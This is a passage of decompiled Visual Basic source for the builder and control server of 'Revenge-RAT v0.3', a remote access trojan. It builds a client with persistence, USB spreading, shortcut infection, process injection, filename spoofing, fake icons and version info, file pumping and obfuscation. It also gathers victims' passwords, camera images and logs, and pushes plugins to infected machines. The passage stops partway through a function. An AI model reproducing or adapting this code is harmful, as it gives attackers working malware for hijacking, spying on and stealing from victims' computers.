                            logs.C(Color.Black, ("[" & Conversions.ToString(DateAndTime.TimeValue(Conversions.ToString(DateAndTime.Now))) & "] : "))
                            logs.C(Color.CornflowerBlue, "Add injectet process name to client!" & ChrW(13) & ChrW(10))
                        Else
                            rV = rV.Replace("%InjectCall%", "").Replace("%RunPEClass%", "")
                            logs.C(Color.Black, ("[" & Conversions.ToString(DateAndTime.TimeValue(Conversions.ToString(DateAndTime.Now))) & "] : "))
                            logs.C(Color.CornflowerBlue, "Remove inject codes!" & ChrW(13) & ChrW(10))
                        End If
                        If Me.EUSB.Checked Then
                            rV = rV.Replace("%FN%.exe", Me.CNINUS.Text.Replace(" ", "")).Replace("%Dir%", Me.FNIUS.Text.Replace(" ", "")).Replace("%Mutex%", Me.RandomVariable(5, 10)).Replace("NVUSV3", Me.RandomVariable(3, 7)).Replace("%HD%", Conversions.ToString(Me.TTINFHD.Checked)).Replace("%Random%", Me.RandomVariable(5, 10)).Replace("%SFN%", Me.RandomVariable(5, 7))
                        End If
                        If Me.PRPR.Checked Then
                            Dim num2 As Integer = 0
                            If (Me.PRCB.SelectedIndex = 0) Then
                                num2 = &H8000
                            ElseIf (Me.PRCB.SelectedIndex = 1) Then
                                num2 = &H4000
                            ElseIf (Me.PRCB.SelectedIndex = 2) Then
                                num2 = &H100
                            ElseIf (Me.PRCB.SelectedIndex = 3) Then
                                num2 = &H80
                            ElseIf (Me.PRCB.SelectedIndex = 4) Then
                                num2 = &H40
                            End If
                            If Me.EUSB.Checked Then
                                rV = rV.Replace("%PC%", My.Resources.ProcessProUSB)
                            Else
                                rV = rV.Replace("%PC%", My.Resources.ProcessPro)
                            End If
                            rV = rV.Replace("%PC%", Conversions.ToString(num2))
                            logs.C(Color.Black, ("[" & Conversions.ToString(DateAndTime.TimeValue(Conversions.ToString(DateAndTime.Now))) & "] : "))
                            logs.C(Color.CornflowerBlue, "Add Process Priority settings to client!" & ChrW(13) & ChrW(10))
                        Else
                            rV = rV.Replace("%PC%", "")
                        End If
                        If Me.SleepCk.Checked Then
                            If Me.EUSB.Checked Then
                                rV = rV.Replace("%Sleep%", My.Resources.SleepUSB)
                            Else
                                rV = rV.Replace("%Sleep%", My.Resources.Sleep)
                            End If
                            rV = rV.Replace("%SLEEP%", Me.SleepTime.Value.ToString)
                            logs.C(Color.Black, ("[" & Conversions.ToString(DateAndTime.TimeValue(Conversions.ToString(DateAndTime.Now))) & "] : "))
                            logs.C(Color.CornflowerBlue, "Add sleep settings to client!" & ChrW(13) & ChrW(10))
                        Else
                            rV = rV.Replace("%Sleep%", "")
                        End If
                        If Me.DF.Checked Then
                            rV = rV.Replace("%DPM%", Conversions.ToString(Me.DF.Checked))
                        Else
                            rV = rV.Replace("%DPM%", "").Replace("%DFN%", "").Replace("%DN%", "")
                        End If
                        If Me.Registry.Checked Then
                            rV = rV.Replace("%REGENBLED%", Conversions.ToString(Me.Registry.Checked))
                        Else
                            rV = rV.Replace("%REGENBLED%", "").Replace("%RGP%", "").Replace("%REGV%", "")
                        End If
                        If Me.SCHULDER.Checked Then
                            rV = rV.Replace("%SENB%", Conversions.ToString(Me.SCHULDER.Checked))
                        Else
                            rV = rV.Replace("%SENB%", "").Replace("%TNINL%", "")
                        End If
                        If Me.CMPM.Checked Then
                            rV = rV.Replace("%COMPLEX%", Conversions.ToString(Me.CMPM.Checked))
                        Else
                            rV = rV.Replace("%COMPLEX%", "").Replace("%CLNITS%", "").Replace("%MoveFolderName%", "").Replace("%DesktopShortcuts%", "").Replace("%QuickLaunch%", "")
                        End If
                        If Me.StartupNormal.Checked Then
                            rV = rV.Replace("%STFENB%", Conversions.ToString(Me.StartupNormal.Checked))
                        Else
                            rV = rV.Replace("%STFENB%", "").Replace("%STF%.EXE", "")
                        End If
                        If Me.VBSCK.Checked Then
                            rV = rV.Replace("%VBSENBALED%", Conversions.ToString(Me.VBSCK.Checked))
                        Else
                            rV = rV.Replace("%VBSENBALED%", "").Replace("%V%", "")
                        End If
                        If Me.JSCK.Checked Then
                            rV = rV.Replace("%JSENB%", Conversions.ToString(Me.JSCK.Checked))
                        Else
                            rV = rV.Replace("%JSENB%", "").Replace("%J%", "")
                        End If
                        If Me.LNKCK.Checked Then
                            rV = rV.Replace("%LNKENABLED%", Conversions.ToString(Me.LNKCK.Checked))
                        Else
                            rV = rV.Replace("%LNKENABLED%", "").Replace("%SCN%", "")
                        End If
                        If Me.URLCK.Checked Then
                            rV = rV.Replace("%URLENABLED%", Conversions.ToString(Me.URLCK.Checked))
                        Else
                            rV = rV.Replace("%URLENABLED%", "").Replace("%SCNU%", "")
                        End If
                        If Me.StartupCodeDomCK.Checked Then
                            rV = rV.Replace("%CODEDOMENABLED%", Conversions.ToString(Me.StartupCodeDomCK.Checked))
                        Else
                            rV = rV.Replace("%CODEDOMENABLED%", "").Replace("%CodeDom%.EXE", "")
                        End If
                        If Me.HFCK.Checked Then
                            If Me.EUSB.Checked Then
                                rV = rV.Replace("%HideFile%", My.Resources.HideFileUSB)
                            Else
                                rV = rV.Replace("%HideFile%", My.Resources.HideFile)
                            End If
                        Else
                            rV = rV.Replace("%HideFile%", "")
                        End If
                        If Me.RCNNS.Checked Then
                            rV = rV.Replace("Nuclear_Explosion", Me.RandomVariable(7, 10)).Replace("Atomic", Me.RandomVariable(1, 5)).Replace("Nuclear Explosion", Me.RandomVariable(6, 8))
                            logs.C(Color.Black, ("[" & Conversions.ToString(DateAndTime.TimeValue(Conversions.ToString(DateAndTime.Now))) & "] : "))
                            logs.C(Color.CornflowerBlue, "change classname - namespace!" & ChrW(13) & ChrW(10))
                        End If
                        File.WriteAllText((Interaction.Environ("Temp") & "\RV.IL"), rV)
                        logs.C(Color.Black, ("[" & Conversions.ToString(DateAndTime.TimeValue(Conversions.ToString(DateAndTime.Now))) & "] : "))
                        logs.C(Color.CornflowerBlue, "Write client!" & ChrW(13) & ChrW(10))
                        Dim startInfo As New ProcessStartInfo
                        Dim info4 As ProcessStartInfo = startInfo
                        info4.FileName = (Interaction.Environ("windir") & "\Microsoft.NET\Framework\v2.0.50727\ilasm.exe")
                        info4.CreateNoWindow = False
                        info4.WindowStyle = ProcessWindowStyle.Hidden
                        If Me.SCPROC.Checked Then
                            info4.Arguments = String.Concat(New String() {"/QUIET """, Interaction.Environ("Temp"), "\RV.IL"" /output:""", fileName, """ /resource:Extensions\Admin.res"})
                        Else
                            info4.Arguments = String.Concat(New String() {"/QUIET """, Interaction.Environ("Temp"), "\RV.IL"" /output:""", fileName, """"})
                        End If
                        info4 = Nothing
                        Process.Start(startInfo).WaitForExit()

                        Try
                            If Me.CIcon.Checked Then
                                If (Me.icopath.Text.Length > 0) Then
                                    Interaction.Shell(String.Concat(New String() {"Extensions\Resource Hacker -addoverwrite ", fileName, ",", fileName, ",", Me.icopath.Text, ", ICONGROUP,1,"}), AppWinStyle.MinimizedFocus, False, -1)
                                Else
                                    Interaction.Shell(String.Concat(New String() {"Extensions\Resource Hacker -addoverwrite ", fileName, ",", fileName, ",", Application.StartupPath, "\", Me.BICONS.SelectedItems.Item(0).ToolTipText, ", ICONGROUP,1,"}), AppWinStyle.MinimizedFocus, False, -1)
                                End If
                                File.Delete((Application.StartupPath & "\Extensions\Resource Hacker.ini"))
                                File.Delete((Application.StartupPath & "\Extensions\Resource Hacker.log"))
                                logs.C(Color.Black, ("[" & Conversions.ToString(DateAndTime.TimeValue(Conversions.ToString(DateAndTime.Now))) & "] : "))
                                logs.C(Color.CornflowerBlue, "Inject icon!" & ChrW(13) & ChrW(10))
                            End If
                        Catch exception3 As Exception
                            ProjectData.SetProjectError(exception3)
                            logs.C(Color.Black, ("[" & Conversions.ToString(DateAndTime.TimeValue(Conversions.ToString(DateAndTime.Now))) & "] : "))
                            logs.C(Color.CornflowerBlue, "Error inject icon!" & ChrW(13) & ChrW(10))
                            ProjectData.ClearProjectError()
                        End Try
                        Try
                            If Me.AssemblyChange.Checked Then
                                File.WriteAllText((Application.StartupPath & "\Extensions\Information.rc"), My.Resources.info)
                                Dim contents As String = File.ReadAllText((Application.StartupPath & "\Extensions\Information.rc")).Replace("%Filever%", Me.FileVersionTX.Text).Replace("%Prover%", Me.ProductVersionTX.Text).Replace("%Company%", Me.AssCom.Text).Replace("%Description%", Me.AssDes.Text).Replace("%Title%", Me.AssTitle.Text).Replace("%CopyRights%", Me.AssCopy.Text).Replace("%Trade%", Me.AssTrade.Text).Replace("%Product%", Me.AssPro.Text).Replace("%UPFV%", Me.FileVersionTX.Text.Replace(".", ",")).Replace("%UPPR%", Me.ProductVersionTX.Text.Replace(".", ","))
                                File.Delete((Application.StartupPath & "\Extensions\Information.rc"))
                                File.WriteAllText((Application.StartupPath & "\Extensions\Information.rc"), contents)
                                Interaction.Shell("Extensions\GoRC /r Extensions\Information.rc", AppWinStyle.MinimizedFocus, False, -1)
                                Interaction.Shell(String.Concat(New String() {"Extensions\Resource Hacker -addoverwrite ", fileName, ",", fileName, ",", Application.StartupPath, "\Extensions\Information.res,VERSIONINFO,1,"}), AppWinStyle.MinimizedFocus, False, -1)
                                File.Delete((Application.StartupPath & "\Extensions\Information.rc"))
                                File.Delete((Application.StartupPath & "\Extensions\Information.res"))
                                File.Delete((Application.StartupPath & "\Extensions\Resource Hacker.ini"))
                                File.Delete((Application.StartupPath & "\Extensions\Resource Hacker.log"))
                                logs.C(Color.Black, ("[" & Conversions.ToString(DateAndTime.TimeValue(Conversions.ToString(DateAndTime.Now))) & "] : "))
                                logs.C(Color.CornflowerBlue, "inject Assembly Information!" & ChrW(13) & ChrW(10))
                            End If
                        Catch exception4 As Exception
                            ProjectData.SetProjectError(exception4)
                            logs.C(Color.Black, ("[" & Conversions.ToString(DateAndTime.TimeValue(Conversions.ToString(DateAndTime.Now))) & "] : "))
                            logs.C(Color.CornflowerBlue, "Error inject Assembly Information!" & ChrW(13) & ChrW(10))
                            ProjectData.ClearProjectError()
                        End Try
                        If File.Exists((Application.StartupPath & "\Extensions\mpress.exe")) Then
                            If Me.MP.Checked Then
                                Try
                                    Dim info2 As New ProcessStartInfo
                                    Dim info5 As ProcessStartInfo = info2
                                    info5.FileName = (My.Application.Info.DirectoryPath & "\Extensions\mpress.exe")
                                    info5.CreateNoWindow = True
                                    info5.WindowStyle = ProcessWindowStyle.Hidden
                                    info5.Arguments = (dialog.FileName.ToString & " -s")
                                    info5 = Nothing
                                    Process.Start(info2).WaitForExit()
                                    logs.C(Color.Black, ("[" & Conversions.ToString(DateAndTime.TimeValue(Conversions.ToString(DateAndTime.Now))) & "] : "))
                                    logs.C(Color.CornflowerBlue, "Compress File!" & ChrW(13) & ChrW(10))
                                Catch exception5 As Exception
                                    ProjectData.SetProjectError(exception5)
                                    logs.C(Color.Black, ("[" & Conversions.ToString(DateAndTime.TimeValue(Conversions.ToString(DateAndTime.Now))) & "] : "))
                                    logs.C(Color.CornflowerBlue, "Error Compress File!" & ChrW(13) & ChrW(10))
                                    ProjectData.ClearProjectError()
                                End Try
                            Else
                                logs.C(Color.Black, ("[" & Conversions.ToString(DateAndTime.TimeValue(Conversions.ToString(DateAndTime.Now))) & "] : "))
                                logs.C(Color.CornflowerBlue, ("Compress status : " & Conversions.ToString(Me.MP.Checked) & ChrW(13) & ChrW(10)))
                            End If
                        End If
                        If Me.EXSPCK.Checked Then
                            Try
                                My.Computer.FileSystem.RenameFile(fileName, (Path.GetFileNameWithoutExtension(fileName) & ChrW(8238) & Strings.StrReverse(Me.EXSPL.Items.Item(Me.EXSPL.SelectedIndex).ToString) & ".exe"))
                                logs.C(Color.Black, ("[" & Conversions.ToString(DateAndTime.TimeValue(Conversions.ToString(DateAndTime.Now))) & "] : "))
                                logs.C(Color.CornflowerBlue, ("Execution spoofer " & Conversions.ToString(Me.EXSPCK.Checked) & ChrW(13) & ChrW(10)))
                            Catch exception6 As Exception
                                ProjectData.SetProjectError(exception6)
                                logs.C(Color.Black, ("[" & Conversions.ToString(DateAndTime.TimeValue(Conversions.ToString(DateAndTime.Now))) & "] : "))
                                logs.C(Color.CornflowerBlue, ("Error Execution spoofer!" & Conversions.ToString(Me.EXSPCK.Checked) & ChrW(13) & ChrW(10)))
                                ProjectData.ClearProjectError()
                            End Try
                        Else
                            logs.C(Color.Black, ("[" & Conversions.ToString(DateAndTime.TimeValue(Conversions.ToString(DateAndTime.Now))) & "] : "))
                            logs.C(Color.CornflowerBlue, ("Execution spoofer " & Conversions.ToString(Me.EXSPCK.Checked) & ChrW(13) & ChrW(10)))
                        End If
                        If Me.FP.Checked Then
                            Try
                                Dim num4 As Double
                                Dim stream As FileStream = File.OpenWrite(fileName)
                                Dim num3 As Long = stream.Seek(0, SeekOrigin.End)
                                If Me.KB.Checked Then
                                    num4 = (Conversion.Val(Me.BC.Value) * 1024)
                                ElseIf Me.MB.Checked Then
                                    num4 = (Conversion.Val(Me.BC.Value) * 1048576)
                                Else
                                    num4 = (Conversion.Val(Me.BC.Value) * 1073741824)
                                End If
                                Do While (num3 < num4)
                                    stream.WriteByte(0)
                                    num3 = (num3 + 1)
                                Loop
                                stream.Close()
                                logs.C(Color.Black, ("[" & Conversions.ToString(DateAndTime.TimeValue(Conversions.ToString(DateAndTime.Now))) & "] : "))
                                logs.C(Color.CornflowerBlue, ("File Pumper " & Conversions.ToString(Me.FP.Checked) & ChrW(13) & ChrW(10)))
                            Catch exception7 As Exception
                                ProjectData.SetProjectError(exception7)
                                logs.C(Color.Black, ("[" & Conversions.ToString(DateAndTime.TimeValue(Conversions.ToString(DateAndTime.Now))) & "] : "))
                                logs.C(Color.CornflowerBlue, "Error Add bytes!" & ChrW(13) & ChrW(10))
                                ProjectData.ClearProjectError()
                            End Try
                        Else
                            logs.C(Color.Black, ("[" & Conversions.ToString(DateAndTime.TimeValue(Conversions.ToString(DateAndTime.Now))) & "] : "))
                            logs.C(Color.CornflowerBlue, ("File Pumper " & Conversions.ToString(Me.FP.Checked) & ChrW(13) & ChrW(10)))
                        End If
                        Try
                            If (File.Exists(fileName) AndAlso ((((Me.ATAM.Checked Or Me.ANIL.Checked) Or Me.OPT.Checked) Or Me.STEN.Checked) Or Me.Obfu.Checked)) Then
                                Dim info3 As New ProcessStartInfo
                                Dim info6 As ProcessStartInfo = info3
                                info6.WindowStyle = ProcessWindowStyle.Normal
                                info6.WorkingDirectory = (Application.StartupPath & "\Extensions\")
                                info6.FileName = "dotNET_Reactor.exe"
                                info6.CreateNoWindow = False
                                info6.Verb = "runas"
                                If Me.MP.Checked Then
                                    Me.MP.Checked = False
                                End If
                                Dim str12 As String = String.Empty
                                str12 = ("dotNET_Reactor.exe -file """ & fileName & """")
                                If Me.ATAM.Checked Then
                                    str12 = (str12 & " -antitamp[1]")
                                End If
                                If Me.ANIL.Checked Then
                                    str12 = (str12 & " -suppressildasm[1]")
                                End If
                                If Me.OPT.Checked Then
                                    str12 = (str12 & " -obfuscate_public_types[1]")
                                End If
                                If Me.STEN.Checked Then
                                    str12 = (str12 & " -stringencryption[1]")
                                End If
                                If Me.Obfu.Checked Then
                                    str12 = (str12 & " -obfuscation[1]")
                                End If
                                info6.Arguments = (str12 & " -targetfile """ & fileName & """")
                                info6 = Nothing
                                Process.Start(info3).WaitForExit()
                            End If
                        Catch exception8 As Exception
                            ProjectData.SetProjectError(exception8)
                            ProjectData.ClearProjectError()
                        End Try
                        Try
                            If File.Exists(String.Concat(New String() {Path.GetDirectoryName(fileName), "\", Path.GetFileNameWithoutExtension(fileName), Path.GetExtension(fileName).ToLower, ".hash"})) Then
                                File.Delete(String.Concat(New String() {Path.GetDirectoryName(fileName), "\", Path.GetFileNameWithoutExtension(fileName), Path.GetExtension(fileName).ToLower, ".hash"}))
                            End If
                        Catch exception9 As Exception
                            ProjectData.SetProjectError(exception9)
                            ProjectData.ClearProjectError()
                        End Try
                        Try
                            If File.Exists("Extensions\reactor.nrcfg") Then
                                File.Delete("Extensions\reactor.nrcfg")
                            End If
                        Catch exception10 As Exception
                            ProjectData.SetProjectError(exception10)
                            ProjectData.ClearProjectError()
                        End Try
                        Try
                            If File.Exists(fileName) Then
                                logs.C(Color.Black, ("[" & Conversions.ToString(DateAndTime.TimeValue(Conversions.ToString(DateAndTime.Now))) & "] : "))
                                logs.C(Color.CornflowerBlue, ("Final Size : " & SocketServer.GetSize(CULng(New FileInfo(fileName).Length)) & ChrW(13) & ChrW(10)))
                                Process.Start("explorer.exe", ("/select," & fileName))
                            End If
                        Catch exception11 As Exception
                            ProjectData.SetProjectError(exception11)
                            ProjectData.ClearProjectError()
                        End Try
                        logs.C(Color.Black, ("[" & Conversions.ToString(DateAndTime.TimeValue(Conversions.ToString(DateAndTime.Now))) & "] : "))
                        logs.C(Color.CornflowerBlue, "Nothing More!" & ChrW(13) & ChrW(10))
                        logs.OK.Enabled = True
                    End If
                End If
            End If
        End If
    End Sub

    Private Sub ComplexInformation_Click(sender As Object, e As EventArgs) Handles ComplexInformation.Click
        MessageBox.Show("This feature allows you to infect all the shortcuts in  [ Desktop - Taskbar - Quick Launch ]" & ChrW(13) & ChrW(10) & "that's mean when anyone clicked in that's shortcut" & ChrW(13) & ChrW(10) & "your client and shortcut file will open in the same time! ." & ChrW(13) & ChrW(10) & "Note: must be the names of folders different", "Revenge-RAT v0.3", MessageBoxButtons.OK, MessageBoxIcon.Asterisk)
    End Sub

    Private Sub COMPSettings_Click(sender As Object, e As EventArgs) Handles COMPSettings.Click
        If Operators.ConditionalCompareObjectEqual(Me.COMPSettings.Tag, "Down", False) Then
            Me.COMPSettings.Tag = "Up"
            Me.COMPSettings.Image = My.Resources.expand_less_white_24x24
            Dim size3 As New Size(Me.TableLayoutPanel33.Size.Width, &H20)
            Me.TableLayoutPanel33.Size = size3
        Else
            Me.COMPSettings.Tag = "Down"
            Me.COMPSettings.Image = My.Resources.expand_more_white_24x24
            Dim size2 As New Size(Me.TableLayoutPanel33.Size.Width, &HC3)
            Me.TableLayoutPanel33.Size = size2
        End If
    End Sub
    Public Sub Connect(ByVal Sock As Integer)
        Try
            If (Me.CommandsListview.Items.Count > 0) Then
                Me.SC(Sock)
                Return
            End If
        Catch exception1 As Exception
            ProjectData.SetProjectError(exception1)
            ProjectData.ClearProjectError()
        End Try
        Try
            If (Me.BlockedIp.Items.Count > 0) Then
                Dim enumerator As IEnumerator
                Try
                    enumerator = Me.BlockedIp.Items.GetEnumerator
                    Do While enumerator.MoveNext
                        Dim current As ListViewItem = DirectCast(enumerator.Current, ListViewItem)
                        If (Me.s.IP(Sock) = current.SubItems.Item(0).Text) Then
                            Me.s.Disconnect(Sock)
                            Dim imageIndex As Integer = Me.ImageList3.Images.IndexOfKey((Me.GeoIP.LookupCountryName(Me.s.IP(Sock)) & ".png"))
                            Dim item2 As ListViewItem = Me.Logs.Items.Add(Sock.ToString, String.Concat(New String() {"[ ", Conversions.ToString(DateAndTime.TimeValue(Conversions.ToString(DateAndTime.Now))), " ] IP : ", Me.s.IP(Sock), " - Server ID : ????"}), imageIndex)
                            item2.ForeColor = Color.Red
                            item2.SubItems.Add("Blocked")
                            item2.ForeColor = Color.Red
                            item2.ToolTipText = (Me.GeoIP.LookupCountryName(Me.s.IP(Sock)) & ".png")
                            Return
                        End If
                    Loop
                Finally
                End Try
            End If
        Catch exception2 As Exception
            ProjectData.SetProjectError(exception2)
            ProjectData.ClearProjectError()
        End Try
    End Sub

    Private Sub ContextMenuStrip1_ItemClicked(sender As Object, e As ToolStripItemClickedEventArgs) Handles ContextMenuStrip1.ItemClicked
        If Conversions.ToBoolean(Operators.NotObject(Operators.CompareObjectEqual(e.ClickedItem.Tag, Nothing, False))) Then
            Dim enumerator As IEnumerator
            Try
                enumerator = Me.Listview1.SelectedItems.GetEnumerator
                Do While enumerator.MoveNext
                    Dim current As ListViewItem = DirectCast(enumerator.Current, ListViewItem)
                    Me.s.Send(Conversions.ToInteger(current.ToolTipText), String.Concat(New String() {"LP", Me.Key, "Plugin", Me.Key, "Plugin", Me.Key, Convert.ToBase64String(SocketServer.Compress(File.ReadAllBytes(Conversions.ToString(e.ClickedItem.Tag)))), Me.Key, current.ToolTipText, Me.Key, Conversions.ToString(False), Me.Key, SocketServer.md5(File.ReadAllBytes(Conversions.ToString(e.ClickedItem.Tag))), Me.Key, Conversions.ToString(True)}))
                Loop
            Finally
            End Try
        End If
    End Sub
    Public Sub data(ByVal sock As Integer, ByVal b As Byte())
        Dim strArray As String() = Strings.Split(Functions.BS(b), Me.Key, -1, CompareMethod.Binary)
        Try
            Dim manager7 As FileManager
            Dim cam2 As Remote_WebCam
            Dim manager35 As System_Manager
            Dim num16 As Integer
            Dim strArray14 As String()
            Dim str7 As String
            Dim str9 As String
            Dim num20 As Integer
            Dim information6 As System_Information
            Dim objArray As Object()
            Dim strArray44 As String()
            Dim num52 As Integer
            Dim objArray2 As Object()
            Dim flagArray As Boolean()
            Dim enumerator11 As IEnumerator
            Dim enumerator12 As IEnumerator
            Dim enumerator13 As IEnumerator
            Dim enumerator22 As IEnumerator
            Dim enumerator23 As IEnumerator
            Dim enumerator24 As IEnumerator
            Dim enumerator25 As IEnumerator
            Dim enumerator26 As IEnumerator
            Dim str13 As String = strArray(0)
            Select Case str13
                Case "PNC"
                    Me.s.Send(sock, "P")
                    Return
                Case "P"
                    Try
                        Dim items2 As ListViewItemCollection = Me.Listview1.Items
                        SyncLock items2
                            Dim enumerator2 As IEnumerator
                            Try
                                enumerator2 = Me.Listview1.Items.GetEnumerator
                                Do While enumerator2.MoveNext
                                    Dim current As ListViewItem = DirectCast(enumerator2.Current, ListViewItem)
                                    If ((Me.Listview1.Items.Count > 0) AndAlso (Conversions.ToDouble(current.ToolTipText) = sock)) Then
                                        current.SubItems.Item(12).Text = (strArray(1) & " ms")
                                        current.Tag = "0"
                                        Return
                                    End If
                                Loop
                            Finally
                            End Try
                        End SyncLock
                    Catch exception27 As Exception
                        ProjectData.SetProjectError(exception27)
                        ProjectData.ClearProjectError()
                    End Try
                    Return
                Case "W"
                    Try
                        Dim items3 As ListViewItemCollection = Me.Listview1.Items
                        SyncLock items3
                            Dim enumerator3 As IEnumerator
                            Try
                                enumerator3 = Me.Listview1.Items.GetEnumerator
                                Do While enumerator3.MoveNext
                                    Dim item5 As ListViewItem = DirectCast(enumerator3.Current, ListViewItem)
                                    If ((Me.Listview1.Items.Count > 0) AndAlso (Conversions.ToDouble(item5.ToolTipText) = sock)) Then
                                        item5.SubItems.Item(13).Text = Conversions.ToString(SocketServer.Decode(strArray(1)))
                                        Return
                                    End If
                                Loop
                            Finally
                                If TypeOf enumerator3 Is IDisposable Then
                                    TryCast(enumerator3, IDisposable).Dispose()
                                End If
                            End Try
                        End SyncLock
                    Catch exception28 As Exception
                    End Try
                    Return
                Case "Information"
                    Dim text As String = String.Empty
                    Dim items As ListViewItemCollection = Me.Listview1.Items
                    SyncLock items
                        Dim countryName As String
                        Dim str3 As String
                        Try
                            If Not My.Computer.FileSystem.DirectoryExists(Conversions.ToString(Operators.ConcatenateObject(Operators.ConcatenateObject(Operators.ConcatenateObject((Application.StartupPath & "\Users\"), SocketServer.Decode(strArray(1))), SocketServer.Decode(strArray(2))), "\Downloads\"))) Then
                                My.Computer.FileSystem.CreateDirectory(Conversions.ToString(Operators.ConcatenateObject(Operators.ConcatenateObject(Operators.ConcatenateObject((Application.StartupPath & "\Users\"), SocketServer.Decode(strArray(1))), SocketServer.Decode(strArray(2))), "\Downloads\")))
                            End If
                        Catch exception1 As Exception
                        End Try
                        Try
                            If Not My.Computer.FileSystem.DirectoryExists(Conversions.ToString(Operators.ConcatenateObject(Operators.ConcatenateObject(Operators.ConcatenateObject((Application.StartupPath & "\Users\"), SocketServer.Decode(strArray(1))), SocketServer.Decode(strArray(2))), "\Desktop\"))) Then
                                My.Computer.FileSystem.CreateDirectory(Conversions.ToString(Operators.ConcatenateObject(Operators.ConcatenateObject(Operators.ConcatenateObject((Application.StartupPath & "\Users\"), SocketServer.Decode(strArray(1))), SocketServer.Decode(strArray(2))), "\Desktop\")))
                            End If
                        Catch exception4 As Exception
                        End Try
                        Try
                        Catch exception5 As Exception
                        End Try
                        Try
                            If Not My.Computer.FileSystem.DirectoryExists(Conversions.ToString(Operators.ConcatenateObject(Operators.ConcatenateObject(Operators.ConcatenateObject((Application.StartupPath & "\Users\"), SocketServer.Decode(strArray(1))), SocketServer.Decode(strArray(2))), "\Logs\"))) Then
                                My.Computer.FileSystem.CreateDirectory(Conversions.ToString(Operators.ConcatenateObject(Operators.ConcatenateObject(Operators.ConcatenateObject((Application.StartupPath & "\Users\"), SocketServer.Decode(strArray(1))), SocketServer.Decode(strArray(2))), "\Logs\")))
                            End If
                        Catch exception6 As Exception
                        End Try
                        Try
                            If Not My.Computer.FileSystem.DirectoryExists(Conversions.ToString(Operators.ConcatenateObject(Operators.ConcatenateObject(Operators.ConcatenateObject((Application.StartupPath & "\Users\"), SocketServer.Decode(strArray(1))), SocketServer.Decode(strArray(2))), "\Camera\"))) Then
                                My.Computer.FileSystem.CreateDirectory(Conversions.ToString(Operators.ConcatenateObject(Operators.ConcatenateObject(Operators.ConcatenateObject((Application.StartupPath & "\Users\"), SocketServer.Decode(strArray(1))), SocketServer.Decode(strArray(2))), "\Camera\")))
                            End If
                        Catch exception7 As Exception
                        End Try
                        Try
                            If Not My.Computer.FileSystem.DirectoryExists(Conversions.ToString(Operators.ConcatenateObject(Operators.ConcatenateObject(Operators.ConcatenateObject((Application.StartupPath & "\Users\"), SocketServer.Decode(strArray(1))), SocketServer.Decode(strArray(2))), "\Passwords\"))) Then
                                My.Computer.FileSystem.CreateDirectory(Conversions.ToString(Operators.ConcatenateObject(Operators.ConcatenateObject(Operators.ConcatenateObject((Application.StartupPath & "\Users\"), SocketServer.Decode(strArray(1))), SocketServer.Decode(strArray(2))), "\Passwords\")))
                            End If
                        Catch exception8 As Exception
                        End Try
                        Try
                            If Not My.Computer.FileSystem.DirectoryExists(Conversions.ToString(Operators.ConcatenateObject(Operators.ConcatenateObject(Operators.ConcatenateObject((Application.StartupPath & "\Users\"), SocketServer.Decode(strArray(1))), SocketServer.Decode(strArray(2))), "\Thumbnails\"))) Then
                                My.Computer.FileSystem.CreateDirectory(Conversions.ToString(Operators.ConcatenateObject(Operators.ConcatenateObject(Operators.ConcatenateObject((Application.StartupPath & "\Users\"), SocketServer.Decode(strArray(1))), SocketServer.Decode(strArray(2))), "\Thumbnails\")))
                            End If
                        Catch exception9 As Exception
                        End Try
                        Try
                            If (Me.Sound AndAlso File.Exists((Application.StartupPath & "\notify.wav"))) Then
                                My.Computer.Audio.Play((Application.StartupPath & "\notify.wav"), AudioPlayMode.Background)
                            End If
                        Catch exception10 As Exception
                        End Try
                        Try
                            countryName = Me.GeoIP.LookupCountryName(Me.s.IP(sock))
                        Catch exception11 As Exception
                            ProjectData.SetProjectError(exception11)
                            countryName = "Unknown"
                            ProjectData.ClearProjectError()
                        End Try
                        Dim imageIndex As Integer = Me.ImageList3.Images.IndexOfKey((countryName & ".png"))
                        If (imageIndex = -1) Then
                            imageIndex = Me.ImageList3.Images.IndexOfKey("Unknown.png")
                        End If
                        Dim item As ListViewItem = Me.Listview1.Items.Add(sock.ToString, countryName, imageIndex)
                        item.ToolTipText = Conversions.ToString(sock)
                        Try
                            [text] = Conversions.ToString(Operators.ConcatenateObject(SocketServer.Decode(strArray(1)), SocketServer.Decode(strArray(2))))
                        Catch exception12 As Exception
                            ProjectData.SetProjectError(exception12)
                            [text] = "????"
                            ProjectData.ClearProjectError()
                        End Try
                        item.SubItems.Add([text])
                        item.SubItems.Add((Me.s.IP(sock) & " / " & strArray(3)))
                        Try
                            NewLateBinding.LateCall(item.SubItems, Nothing, "Add", New Object() {RuntimeHelpers.GetObjectValue(SocketServer.Decode(strArray(4)))}, Nothing, Nothing, Nothing, True)
                        Catch exception13 As Exception
                            ProjectData.SetProjectError(exception13)
                            item.SubItems.Add("????")
                            ProjectData.ClearProjectError()
                        End Try
                        Try
                            item.SubItems.Add(strArray(5))
                        Catch exception14 As Exception
                            ProjectData.SetProjectError(exception14)
                            item.SubItems.Add("????")
                            ProjectData.ClearProjectError()
                        End Try
                        Try
                            str3 = SocketServer.Decode(strArray(6)).ToString.Replace("Microsoft Windows", "Win")
                            item.SubItems.Add(str3)
                        Catch exception15 As Exception
                            ProjectData.SetProjectError(exception15)
                            str3 = "????"
                            item.SubItems.Add("????")
                            ProjectData.ClearProjectError()
                        End Try
                        Try
                            NewLateBinding.LateCall(item.SubItems, Nothing, "Add", New Object() {RuntimeHelpers.GetObjectValue(SocketServer.Decode(strArray(7)))}, Nothing, Nothing, Nothing, True)
                        Catch exception16 As Exception
                            ProjectData.SetProjectError(exception16)
                            item.SubItems.Add("????")
                            ProjectData.ClearProjectError()
                        End Try
                        Try
                            NewLateBinding.LateCall(item.SubItems, Nothing, "Add", New Object() {RuntimeHelpers.GetObjectValue(SocketServer.RAM(strArray(8)))}, Nothing, Nothing, Nothing, True)
                        Catch exception17 As Exception
                            ProjectData.SetProjectError(exception17)
                            item.SubItems.Add("????")
                            ProjectData.ClearProjectError()
                        End Try
                        Try
                            NewLateBinding.LateCall(item.SubItems, Nothing, "Add", New Object() {RuntimeHelpers.GetObjectValue(SocketServer.Decode(strArray(9)))}, Nothing, Nothing, Nothing, True)
                        Catch exception18 As Exception
                            ProjectData.SetProjectError(exception18)
                            item.SubItems.Add("????")
                            ProjectData.ClearProjectError()
                        End Try
                        Try
                            NewLateBinding.LateCall(item.SubItems, Nothing, "Add", New Object() {RuntimeHelpers.GetObjectValue(SocketServer.Decode(strArray(10)))}, Nothing, Nothing, Nothing, True)
                        Catch exception19 As Exception
                            ProjectData.SetProjectError(exception19)
                            item.SubItems.Add("????")
                            ProjectData.ClearProjectError()
